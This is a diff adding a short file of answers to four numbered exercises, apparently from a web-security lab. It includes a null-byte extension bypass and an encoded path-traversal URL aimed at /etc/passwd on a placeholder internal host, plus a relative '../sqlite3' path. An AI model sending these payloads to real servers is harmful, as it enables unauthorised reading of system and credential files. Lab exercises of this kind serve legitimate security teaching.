@@ -1,0 +1,17 @@
+Zad 1.
+
+default
+https://i.kym-cdn.com/entries/icons/original/000/013/564/doge.jpg
+
+test:
+bob
+
+Zad 2.
+../sqlite3
+https://www.youtube.com/sql.db
+
+Zad 3.
+http://internal.company.com:8080/index.html%00.txt
+
+Zad 4.
+http://internal.company.com:8080/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00.txt
